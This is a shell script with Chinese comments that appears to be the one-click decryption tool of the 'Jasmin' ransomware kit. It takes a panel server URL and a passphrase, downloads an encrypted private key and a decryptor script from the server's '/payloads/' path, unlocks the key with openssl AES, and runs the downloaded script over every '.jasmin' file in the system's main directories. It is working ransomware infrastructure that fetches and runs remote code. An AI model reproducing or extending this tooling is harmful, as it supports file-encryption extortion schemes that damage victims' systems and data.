#!/bin/sh
# ════════════════════════════════════════════════════════════════
# Jasmin 一键解密器 — 纯 openssl 实现，零依赖
#   不需要 pip / cryptography / 编译，任何带 openssl 的机器都能跑
#
# 用法:
#   sh jasmin_unlock.sh <后台地址> <K口令> [目录1 目录2 ...]
#
# 不指定目录时 => 解密【全部】加密文件（扫描 /home /root /var /opt /tmp /srv
#                 及所有真实挂载点下每一个 .jasmin）。
# 指定目录时    => 只解密这些目录（逗号或空格分隔均可）。
#
# 示例:
#   sh jasmin_unlock.sh http://1.2.3.4:8080 7bc5cf6c...             # 解密全部
#   sh jasmin_unlock.sh http://1.2.3.4:8080 7bc5cf6c... /data       # 只解 /data
#   sh jasmin_unlock.sh http://1.2.3.4:8080 7bc5cf6c... /data /srv  # 多个目录
# ════════════════════════════════════════════════════════════════
# 强制 C locale：二进制↔十六进制转换不能被 UTF-8 污染
export LC_ALL=C
export LANG=C

SRV="${1:-}"
K="${2:-}"
# 从网页复制粘贴 K 常带上换行/空格（Windows 复制还会带 CR）。
# openssl 的 -K 收到空白会直接解析失败，而用户看到的是"口令错误"，
# 会误判成密钥不可用 —— 这是纯噪声，先剥掉。
K=$(printf '%s' "$K" | tr -d ' \t\r\n')

if [ -z "$SRV" ] || [ -z "$K" ]; then
    echo "Usage: $0 <server-url> <K-passphrase> [dir1 dir2 ...]"
    echo "  e.g.: $0 http://1.2.3.4:8080 7bc5cf6c... /path/to/data"
    exit 1
fi

# shift 必须放在参数校验之后：dash（Ubuntu/Debian 的 /bin/sh）在参数不足时
# 执行 shift 会抛 "Bad substitution" 并终止脚本（rc=2，连 Usage 都打不出来），
# 而 bash 只是返回非零并继续。走到这里 $# >= 2 已成立，shift 必然成功。
shift 2

# 目录：未指定 => 解密全部加密文件（下面不向解密器传目录，由它用全量默认范围）
if [ -n "$*" ]; then
    # 允许逗号分隔，统一转成空格分隔
    DIRS=$(printf '%s' "$*" | tr ',' ' ')
    echo "[*] Explicit directories: $DIRS"
else
    DIRS=""
    echo "[*] No directory given - will decrypt ALL encrypted files (6 default roots + real mount points)"
fi

command -v openssl >/dev/null 2>&1 || { echo "[!] openssl not found - cannot decrypt"; exit 1; }
command -v od >/dev/null 2>&1 || { echo "[!] od command not found"; exit 1; }

TD="/tmp/.junlock_$$"
mkdir -p "$TD" || exit 1
trap 'rm -rf "$TD"' EXIT INT TERM

DL(){
    if command -v curl >/dev/null 2>&1; then
        curl -sL "$1" -o "$2"
    elif command -v wget >/dev/null 2>&1; then
        wget -q -O "$2" "$1"
    else
        echo "[!] need curl or wget"; return 1
    fi
    [ -s "$2" ]
}

echo "[*] Downloading encrypted private key..."
DL "$SRV/payloads/jasmin_private.pem.enc" "$TD/k.enc" || { echo "[!] Failed to download private key: $SRV/payloads/jasmin_private.pem.enc"; exit 1; }

echo "[*] Downloading decryptor..."
DL "$SRV/payloads/jasmin_decrypt_openssl.sh" "$TD/dec.sh" || { echo "[!] Failed to download decryptor"; exit 1; }

# ── 解开私钥 ──
# 存储格式: base64( IV(16B) + AES-CBC密文 )，PKCS7 padding
# PHP 端 keygen 用 aes-256-cbc + 32个ASCII字节；Python 端用 AES-128 + fromhex(K)。
# 这里两种都试，谁解出合法 PEM 用谁。
echo "[*] Decrypting private key (AES)..."
openssl base64 -d -A -in "$TD/k.enc" -out "$TD/blob" 2>/dev/null || { echo "[!] base64 decode failed"; exit 1; }
dd if="$TD/blob" bs=1 count=16 2>/dev/null > "$TD/iv"
dd if="$TD/blob" bs=1 skip=16 2>/dev/null > "$TD/ct"
IVHEX=$(od -An -tx1 "$TD/iv" | tr -d ' \n')
KEYHEX_ASCII=$(printf '%s' "$K" | od -An -tx1 | tr -d ' \n')

try_dec(){
    # $1=cipher  $2=keyhex
    rm -f "$TD/priv.pem"
    openssl enc -d -"$1" -K "$2" -iv "$IVHEX" -in "$TD/ct" -out "$TD/priv.pem" 2>/dev/null || return 1
    [ -s "$TD/priv.pem" ] || return 1
    head -c 32 "$TD/priv.pem" | grep -q "BEGIN" || return 1
    return 0
}

OK=""
# 两台后台写入 .pem.enc 的方式是【完全一致】的：AES-128-CBC，密钥 = K 十六进制
# 解码后的 16 字节，即 -K "<K 原样>"（见 keygen.php:55 与 app.py 的 keygen）。
# 注意 app.py 的注释写着 "AES-256-CBC / 256 bit"，但代码是 secrets.token_hex(16)
# → 只有 16 字节，实际就是 AES-128。注释是错的，行为与 PHP 端一致。
# 所以下面第一条才是常态；旧版本标签把两者写反了，会让人以为换过后台实现。
# 第二条只是历史遗留格式的兜底（早期把 K 的 ASCII 十六进制当 32 字节密钥用），
# 保留是为了还能打开旧备份。
if try_dec aes-128-cbc "$K"; then
    OK="AES-128-CBC (standard key format - both PHP and Python panels)"
elif try_dec aes-256-cbc "$KEYHEX_ASCII"; then
    OK="AES-256-CBC (legacy key format from an older build)"
fi

if [ -z "$OK" ]; then
    echo "[!] Private key decryption failed - wrong K passphrase, or the key file is corrupt/replaced"
    echo "    Please copy the K passphrase again from the panel's Decryption page (it changes whenever keys are regenerated)"
    exit 1
fi
echo "[+] Private key unlocked ($OK)"

# ── 执行解密 ──
echo "[*] Decrypting files..."
echo ""
if [ -n "$DIRS" ]; then
    sh "$TD/dec.sh" "$TD/priv.pem" $DIRS
else
    sh "$TD/dec.sh" "$TD/priv.pem"          # 不传目录 => 解密器扫描全量范围
fi
RC=$?
echo ""
if [ "$RC" -eq 0 ]; then
    echo "[+] Done. Private key and temporary files cleaned up."
else
    echo "[!] Decryptor exited with code $RC - see the output above."
fi
exit $RC
